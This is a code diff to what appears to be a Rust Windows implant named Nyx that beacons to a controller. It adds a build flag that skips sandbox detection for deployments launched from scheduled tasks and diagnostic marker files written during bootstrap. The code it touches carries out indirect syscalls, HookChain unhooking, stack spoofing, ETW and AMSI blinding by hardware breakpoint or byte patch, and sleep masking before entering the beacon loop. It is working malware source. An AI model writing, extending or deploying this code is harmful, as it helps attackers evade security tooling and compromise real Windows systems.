@@ -50,16 +50,23 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     //   (a research VPS IS a VM, so CPUID/RDTSC correctly flag it). The gate
     //   reads the env via GetEnvironmentVariableA — production deployments
     //   never set this variable, so the anti-analysis suite runs normally.
-    let skip_sandbox = unsafe {
-        crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA")
-            .map(|addr| {
-                type FnGetEnv = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
-                let f: FnGetEnv = core::mem::transmute(addr);
-                let mut buf = [0u8; 2];
-                let n = f(b"NYX_SKIP_SANDBOX\0".as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
-                n == 1 && buf[0] == b'1'
-            })
-            .unwrap_or(false)
+    // Skip sandbox detection if NYX_SKIP_SANDBOX=1 env var is set (for testing
+    // on VMs/VPS where envprobe correctly flags the virtual environment), OR
+    // if compiled with the `nyx_skip_sandbox` cfg flag (for SYSTEM-context
+    // deployments where env vars can't be reliably passed through schtask).
+    let skip_sandbox = {
+        let env_skip = unsafe {
+            crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA")
+                .map(|addr| {
+                    type FnGetEnv = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
+                    let f: FnGetEnv = core::mem::transmute(addr);
+                    let mut buf = [0u8; 2];
+                    let n = f(b"NYX_SKIP_SANDBOX\0".as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
+                    n == 1 && buf[0] == b'1'
+                })
+                .unwrap_or(false)
+        };
+        env_skip || cfg!(nyx_skip_sandbox)
     };
 
     if !skip_sandbox && matches!(
@@ -80,12 +87,15 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     }
 
     let _ssn_table = ntdll.resolve_table_owned();
+    diag_mark(b"1_syscalls");
 
     // Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
     crate::syscalls::init_global();
+    diag_mark(b"2_init_global");
 
     // HookChain
     let _hookchain_count = unsafe { crate::hookchain::apply() };
+    diag_mark(b"3_hookchain");
 
     // .pdata gap scan + stack-spoof init.
     let scanner = crate::evasion_glue::LivePdataScanner;
@@ -94,12 +104,16 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         unsafe { crate::stack::set_gap_pool(leaked) };
         let _ = crate::stack::stage_for(leaked);
     }
+    diag_mark(b"4_pdata");
 
     // BLIND: HWBP → byte-patch fallback
     let mut hwbp_ok = false;
     if unsafe { crate::blind_hwbp::init_shadow_buffer() } {
+        diag_mark(b"5a_hwbp_init");
         let etw_slot = unsafe { crate::blind_hwbp::blind_etw_hwbp() };
+        diag_mark(b"5b_hwbp_etw");
         let _amsi_slot = unsafe { crate::blind_hwbp::blind_amsi_hwbp() };
+        diag_mark(b"5c_hwbp_amsi");
         hwbp_ok = etw_slot.is_ok();
     }
     if !hwbp_ok {
@@ -107,6 +121,7 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         let _ = crate::blind::patch_nt_trace_event();
         let _ = crate::blind::patch_amsi();
     }
+    diag_mark(b"6_blind_done");
 
     // ---- CSPRNG registration -------------------------------------------------
     // The no_std PIC implant can't use getrandom's static #[link(name="advapi32")]
@@ -115,6 +130,8 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     // SystemFunction036 (RtlGenRandom) in advapi32.dll via export_addr, call it
     // directly. SystemFunction036 is the documented stable CSPRNG entry point,
     // available on every Windows version from XP SP2 through 11 25H2.
+    nyx_protocol::crypto::register_csprng(csprng_fill);
+    diag_mark(b"7_csprng");
     nyx_protocol::crypto::register_csprng(csprng_fill);
 
     Some(ntdll)
@@ -180,10 +197,9 @@ pub unsafe extern "system" fn nyx_entry() {
             core::hint::spin_loop();
         }
     };
+    diag_mark(b"8_before_loop");
     crate::beacon::beacon_loop();
 }
-
-/// **Diagnostic entry**: runs beacon_oneshot with MINIMAL init (ntdll locate +
 /// CSPRNG register + syscalls only — NO hookchain/blind/pdata). Tests whether
 /// the evasion init in bootstrap() is causing the 0xC0000409 abort.
 /// Exit codes: same as beacon_oneshot (0xC1 = check-in failed, etc).
@@ -207,9 +223,9 @@ pub unsafe extern "system" fn nyx_entry_noevasion() {
 }
 
 /// Minimal initialization: ntdll locate + SSN table + syscalls + CSPRNG.
-/// Skips hookchain/blind/pdata (the evasion init that causes abort on some hosts).
-/// Also disables Foliage sleepmask (it depends on the evasion init — without
-/// the stack gap pool + heap regions it aborts on the first sleep cycle).
+/// Skips hookchain/blind/pdata (the evasion init). Foliage sleepmask stays
+/// enabled — it degrades internally to the data-only floor (heap masking +
+/// indirect-syscall sleep) which is safe without the evasion init.
 unsafe fn init_minimal() {
     let ntdll = match crate::resolve::LiveNtdll::locate() {
         Some(n) => n,
@@ -218,7 +234,6 @@ unsafe fn init_minimal() {
     let _ssn = ntdll.resolve_table_owned();
     crate::syscalls::init_global();
     nyx_protocol::crypto::register_csprng(csprng_fill);
-    crate::sleep::set_foliage_enabled(false);
 }
 
 /// Helper: resolve ExitProcess and exit with `code`. Never returns.
@@ -229,6 +244,61 @@ unsafe fn exit_in_entry(code: u32) -> ! {
     }
     loop {
         core::hint::spin_loop();
+    }
+}
+
+/// Diagnostic: write a marker file `C:\nyx\diag_<mark>` so we can see which
+/// bootstrap step was reached before a crash. Uses CreateFileA/WriteFile
+/// resolved via PEB walk (no std fs). Best-effort — silently ignores errors.
+pub fn diag_mark(mark: &[u8]) {
+    unsafe {
+        use core::ffi::c_void;
+        type CreateFileAFn = unsafe extern "system" fn(*const u8, u32, u32, *mut c_void, u32, u32, *mut c_void) -> *mut c_void;
+        type WriteFileFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
+        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+
+        let cfa = match crate::resolve::export_addr(b"kernel32.dll", b"CreateFileA") {
+            Some(a) => a,
+            None => return,
+        };
+        let wf = match crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") {
+            Some(a) => a,
+            None => return,
+        };
+        let ch = match crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
+            Some(a) => a,
+            None => return,
+        };
+
+        let create: CreateFileAFn = core::mem::transmute(cfa);
+        let write: WriteFileFn = core::mem::transmute(wf);
+        let close: CloseHandleFn = core::mem::transmute(ch);
+
+        // Build path: C:\nyx\diag_<mark>
+        let mut path = [0u8; 64];
+        let prefix = b"C:\\nyx\\diag_";
+        let mut i = 0;
+        while i < prefix.len() && i < path.len() {
+            path[i] = prefix[i];
+            i += 1;
+        }
+        let mut j = 0;
+        while j < mark.len() && i < path.len() - 1 {
+            path[i] = mark[j];
+            i += 1;
+            j += 1;
+        }
+        path[i] = 0; // NUL terminator
+
+        // CREATE_ALWAYS=2, GENERIC_WRITE=0x40000000, FILE_SHARE_WRITE=2
+        let h = create(path.as_ptr(), 0x40000000, 2, core::ptr::null_mut(), 2, 0, core::ptr::null_mut());
+        if h.is_null() || h as usize == usize::MAX {
+            return;
+        }
+        let data = b"ok";
+        let mut written: u32 = 0;
+        write(h, data.as_ptr(), data.len() as u32, &mut written, core::ptr::null_mut());
+        close(h);
     }
 }
 
